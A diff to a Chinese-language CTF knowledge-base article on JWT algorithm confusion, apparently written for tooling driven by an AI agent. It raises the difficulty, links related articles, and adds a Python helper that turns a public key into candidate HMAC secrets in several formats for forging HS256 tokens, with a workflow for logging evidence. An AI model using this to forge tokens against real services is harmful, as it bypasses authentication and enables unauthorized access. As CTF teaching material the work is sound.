@@ -11,11 +11,11 @@ category: "02-auth"
 signals: ["算法混淆", "algorithm confusion", "RS256", "HS256", "公钥", "JWKS", "HMAC", "jwt_tool"]
 mcp_tools: ["run_ctf_tool", "http_probe"]
 keywords: ["JWT算法混淆", "RS256转HS256", "JWT bypass", "公钥泄露", "jwks.json", "algorithm confusion", "jwt_tool"]
-difficulty: "intermediate"
+difficulty: "advanced"
 tags: ["authentication", "jwt", "algorithm-confusion", "web-security", "crypto", "ctf"]
 language: "zh-CN"
 last_updated: "2026-07-04"
-related_articles: []
+related_articles: ["ctf-website/02-auth/jwt/00-overview", "ctf-website/02-auth/jwt/04-kid-injection", "ctf-website/02-auth/jwt/05-jku-x5u-abuse", "ctf-website/13-signature/01-algorithm"]
 ---
 
 # JWT 算法混淆 (Algorithm Confusion)
@@ -46,6 +46,35 @@ related_articles: []
 | ES -> HS | 用 EC public key bytes 作 HMAC secret | 错误变业务响应 | 跟进库实现 |
 | alg 大小写 | `hs256`, `HS256` | parser 归一化差异 | 组合 none/kid |
 | kid 指向公开 key | 换 `kid` + HS256 | key 选择可控 | 转 kid injection |
+
+### 0.2 公钥格式 oracle
+
+算法混淆经常卡在“服务端拿哪种 key bytes 做 HMAC”。同一把公钥要尝试 PEM 原文、DER、JWK JSON、modulus、x/y 坐标、去头尾 PEM。
+
+```python
+# jwt_key_format_oracle.py — 生成 HS secret 候选
+import base64
+import json
+import re
+
+def pem_to_der(pem):
+    body = re.sub(r"-----[^-]+-----|\s+", "", pem)
+    return base64.b64decode(body)
+
+def key_candidates(pem=None, jwk=None):
+    if pem:
+        yield ("pem_raw", pem.encode())
+        yield ("pem_stripped", re.sub(r"-----[^-]+-----|\s+", "", pem).encode())
+        yield ("der", pem_to_der(pem))
+    if jwk:
+        raw = json.dumps(jwk, separators=(",", ":")).encode()
+        yield ("jwk_json", raw)
+        for k in ("n", "x", "y"):
+            if k in jwk:
+                yield (f"jwk_{k}", jwk[k].encode())
+```
+
+Evidence 里保存 `key_format_matrix.csv`：`format`、candidate hash、forged alg、kid、接口、响应 hash、业务字段。只有某个 key format 触发业务响应，才继续固化伪造器。
 
 ## 原理
 
